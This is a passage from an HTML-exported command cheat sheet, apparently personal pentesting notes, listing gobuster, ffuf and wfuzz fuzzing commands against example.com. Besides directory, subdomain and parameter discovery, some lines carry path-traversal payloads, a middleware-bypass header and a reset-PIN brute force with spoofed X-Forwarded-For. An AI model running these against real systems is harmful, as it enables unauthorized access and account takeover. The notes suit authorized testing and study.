-u http://api.example.com/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80c6-b685-ec1ad4e32ecf" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster vhost -u http://example.com/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -r</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-804a-9e3d-fe4180ce9b10" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">gobuster dir -u &quot;http://example.com/api/download?example=../../../app/.next/&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -H &quot;X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware&quot;</code></pre></div><div style="display:contents" dir="auto"><hr id="386a083f-29df-800c-86a0-c287cf377c9a"/></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-80b7-b915-da6bf07037ec" class="">FFUF</h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80ea-8b1c-d547c6d9bf10" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FFUZ -u http://example.com:8080/FFUZ -ic</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8024-81d3-e4da56508bef" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8067-8c9c-eca7788ecd1d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u &#x27;http://example.com/admin/?FUZZ=&#x27; -b PHPSESSID=k6khfp0o2ebg09u222rj2vtqh6 --fs 1678</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8081-a879-d5b68e32d6ae" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u &quot;http://example.com/&quot; -H &quot;Host: FUZZ.example.com&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-808a-90cd-d83d3a6a604d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://example.com -H &quot;Host: FUZZ.example.com&quot; -fl 187</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80c5-b36c-db4d9b4a9e5e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com -H &#x27;Host: FUZZ.example.com&#x27; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 178 -fl 364</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-803a-a049-ce2e325d041b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com -H &quot;Host: FUZZ.example.com&quot; -w /usr/share/spiderfoot/spiderfoot/dicts/subdomains.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80c9-91d8-f79ba3db7321" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com -H &quot;Host: FUZZ.example.com&quot; -w /usr/share/spiderfoot/spiderfoot/dicts/subdomains.txt -fs 1131</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8092-9028-ddb439ee2f1b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FFUZ -u http://example.com/FFUZ -ic -t 100</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8014-8e93-dd664a892c7f" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://example.com/FFUZ -ic -t 100</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80d4-bbd9-d538a6ca86bd" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &quot;Host: FUZZ.example.com&quot; -u http://example.com/ -ic -fs 230</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-806c-b4a9-e1925c5eb07a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.example.com/FUZZ -ic -t 20</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8056-b10a-f632050a95c8" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u &quot;http://example.com/?q=accounts/FUZZ&quot; -c -v -mc 403</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8041-a2e1-c8fa3d53039d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -k -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://example.com/FUZZ -mc all -fs 0</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80ce-95e0-f4994af8c3a2" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -k -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://example.com/api/FUZZ -X POST -mc all -fs 50</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80d4-8a94-ce8f7aca3703" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com -H &#x27;Host: FUZZ.example.com&#x27; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,404 -fc 302
+
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8067-b779-fe3b0a6d598c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 10</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8005-88e5-f167dfbd1cf3" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://example.com:8008 -H &quot;Host: FUZZ.example.com&quot; -fs 7676</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8004-8b1e-dec993e8d0aa" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &#x27;Host: FUZZ.example.com&#x27; -u http://example.com -c -fs 178</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80da-ab6b-c534a7a3176d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u &#x27;http://example.com/view.php?username=FUZZ&amp;file=kavi.pdf&#x27; -w /usr/share/seclists/Usernames/Names/names.txt -H &#x27;Cookie: PHPSESSID=jb599bpkhitg4vt8mmc7j2h30n&#x27; -fs 2985</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80e1-90fe-c89b4f31b62e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ -u &quot;http://example.com/FUZZ&quot; -ic</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80b9-955a-cfbd6e665240" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ -u &quot;http://example.com/FUZZ&quot; -ic -e .php</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8068-aca5-de913709766d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FFUZ -H &quot;Host: FFUZ.example.com&quot; -u http://example.com -fw 20</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80ed-9cef-e8e8a62b8cb1" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u &quot;http://example.com/FUZZ&quot; -c -v</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-806f-81f0-c48ce33a7482" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u &quot;http://example.com/themes/FUZZ&quot; -c -v</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8091-abaf-d6bcfe5433de" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u &quot;http://example.com/themes/bike/FUZZ&quot; -t 200 -fc 403</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8051-909f-c89965d650c8" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &quot;Host: FUZZ.example.com&quot; -u http://example.com -t 200 -ic</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-802e-a2a7-f71ff3efb722" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &quot;Host: FUZZ.example.com&quot; -u http://example.com -t 200 -ic -fw 18</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8095-aa85-cacae9602395" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8007-9152-f2676fb64cd0" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -H &quot;Accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4&quot; -u http://example.com/api/v1/tickets/FUZZ -w 4digit_uid -fs 42</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80ea-9027-d4ba6e2fce1d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com/download.php?id=FUZZ -w id.txt -mc 200 -H &quot;Cookie: PHPSESSID=qrt3une4lurooinq3n495dp3m6&quot;</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8099-b380-f3b0d859faea" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u &#x27;http://example.com/api/download?FUZZ=test&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H &#x27;Host: example.com&#x27; -H &#x27;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#x27; -r -mc all -fs 0</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8067-819d-e1ed21e28e11" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.example.com&quot; -fc 404,400 -fs 21456</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8031-83f4-cc00398bdf7e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php -fc 404</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80c4-ac5f-cfaaedc4dc9a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.html,.js,.json,.config -fc 404</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-801d-adfa-e5f5d51f8d6b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -X POST -u http://example.com/api/v1/user/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404,405 -mc all</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-803e-be45-cfda3b75dd0c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u &quot;http://example.com/dashboard.php?FUZZ=1&quot; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 404</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-809f-b2d6-df4e44dbccc3" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u &#x27;http://example.com:5000/dashboard&#x27; -H &#x27;Cookie: session=FUZZ&#x27; -w cookies.txt -mc 200</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80b6-8f51-e4a32b60555f" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u &quot;http://example.com:8000/?page=../../../../proc/FUZZ/cmdline&quot; -w &lt;(seq 1 10000) -mr &#x27;dotnet&#x27;</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-804a-b5c8-c633c9626f8d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://example.com/FUZZ -ic -t 100</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-809d-8aa9-cc0978beb5d3" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">ffuf -u http://example.com -H &quot;Host: FUZZ.example.com&quot; -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -fs 251273</code></pre></div><div style="display:contents" dir="auto"><hr id="386a083f-29df-8050-9d3a-d1b818fadaed"/></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-805f-9e3a-c4849ee4da36" class="">Wfuzz</h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8056-bae4-f0e7006ef1ff" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -c -w wordlist.txt -u http://example.com -H &quot;Host: FUZZ.example.com&quot; --hc 301</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8078-aa7e-f46eb40d3397" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -c --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &#x27;http://example.com/FUZZ&#x27;</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8087-b68d-f1ce18802383" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hw 2 &quot;http://example.com/users/list.php?FUZZ=test&quot;</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8080-add3-d88bc55dc18e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=19 http://example.com/sync?FUZZ=writeup</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80e4-af9e-e421fb842747" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -H &#x27;Cookie: XSRF-TOKEN=eyJpd...&lt;SNIP&gt;.....woiIn0%3D&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -u http://example.com/api/resettoken -d &#x27;name=admin&amp;pin=FUZZ&#x27; -z range,1000-9999 -m zip -w numbers -H &#x27;X-Forwarded-For: 127.0.0.FUZZ&#x27; --hh 5644</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8063-b4ed-e3f7b35a8d9e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -H &#x27;Cookie: XSRF-TOKEN=eyJpdi...&lt;SNIP&gt;...nIjoiIn0%3D&#x27; -H &#x27;Content-Type: application/x-www-formurlencoded&#x27; -u http://example.com/api/resettoken -d &#x27;name=admin&amp;pin=FUZZ&#x27; -z range,1000-9999</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-808d-be90-e1acb684f2ef" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -u http://example.com/FUZZ -w vault.txt -R2 --hc 404</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80fc-8409-de38a224ff5c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -u http://example.com/sparklays/FUZZ -w /usr/share/wordlists/dirb/common.txt -R2 --hc 404 --hl 11</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80ec-9a0d-cf3be5952a4e" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -u http://example.com:8000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8086-8746-cc8fe8d4358b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -H &quot;Host: FUZZ.example.com&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --hw 25 --hc 400 -t 100 http://example.com</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80ad-81c4-e4b1f38edff5" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &quot;Host: FUZZ.example.com&quot; --hh 20750 http://example.com</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80b6-a25a-ef432ad80a7a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -H &quot;Host: FUZZ.example.com&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --hw 25 --hc 400 -t 100 http://example.com</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80bd-8db5-e54700020c65" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d &quot;username=FUZZ&amp;password=abcd&quot; -u http://example.com/login.php</code></pre></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-8081-8cf8-e426ede9485b" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d &quot;username=FUZZ&amp;password=abcd&quot; -u http://example.com/login.php --hh 7074</code></pre></div><div style="display:contents" dir="auto"><hr id="386a083f-29df-8070-b50d-fe268e847890"/></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8026-8f14-fab1cce2f77e" class="">
+</p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80c5-ba76-ff3025313878" class="">
+</p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8052-936d-ee8a6113e0c4" class="">
+</p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8042-9b3b-d4966e0b5729" class="">
+</p></div><div style="display:contents" dir="auto"><p id="385a083f-29df-80ce-87fc-fda31e785e91" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
